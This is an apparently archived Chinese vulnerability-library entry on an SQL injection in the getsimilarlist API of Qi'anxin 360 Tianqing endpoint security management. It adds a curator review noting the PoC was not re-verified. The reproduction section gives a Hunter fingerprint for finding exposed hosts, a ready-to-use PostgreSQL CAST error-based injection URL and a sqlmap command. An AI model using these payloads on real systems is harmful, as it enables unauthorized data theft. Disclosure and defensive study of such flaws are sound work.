---
source: "wy876 漏洞文库"
id: "vw-b2633f4936dc1f9664da4c1f"
entity_id: "ve-b2633f4936dc1f9664da4c1f"
schema_version: "1"
title: "360天擎终端安全管理系统getsimilarlist存在SQL注入漏洞"
product: "奇安信360天擎管理服务，非IoT硬件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "PostgreSQL CAST报错，未给认证/版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/360/360%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fgetsimilarlist%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ll2p6g6smkyvov6w"
source_status: "recorded"
previous_fofa_unverified: "app.name=="
hunter: "app.name==\"天擎终端安全管理系统\""
---

# 360天擎终端安全管理系统getsimilarlist存在SQL注入漏洞

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：奇安信360天擎管理服务，非IoT硬件
- 本文讨论：api/client/getsimilarlist status数组SQL注入
- 版本、权限与配置前提：PostgreSQL CAST报错，未给认证/版本
- 资料类型：报错SQL注入参数线索；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 重分类安全管理服务，360为历史产品称呼需规范
- 有期望qzbkq1qpzzq但无实际响应/对照，URL空格需编码
- 元数据FOFA误装残缺Hunter语法
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- PostgreSQL错误通道与受影响构建待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
天擎终端安全管理系统是面向政企单位推出的一体化终端安全产品解决方案。该产品集防病毒、终端安全管控、终端准入、终端审计、外设管控、EDR等功能于一体，兼容不同操作系统和计算平台，帮助客户实现平台一体化、功能一体化、数据一体化的终端安全立体防护;奇安信360天擎getsimilarlist存在SQL注入漏洞，攻击者可通过此漏洞获取敏感信息。

# 二、影响版本
+ 360天擎终端安全管理系统

# 三、资产测绘
+ hunter`app.name=="天擎终端安全管理系统"`
+ 特征


# 四、漏洞复现
响应中存在`qzbkq1qpzzq`表示可能存在漏洞

```plain
/api/client/getsimilarlist?status[0,1]=(CAST((CHR(113)||CHR(122)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (8327=8327) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(122)||CHR(113)) AS NUMERIC))&status[0]=1
```


sqlmap

```plain
python3 sqlmap.py  -u "https://xx.xx.xx.xx/api/client/getsimilarlist?status[0,1]=1&status[0]=1" --batch
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ll2p6g6smkyvov6w>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
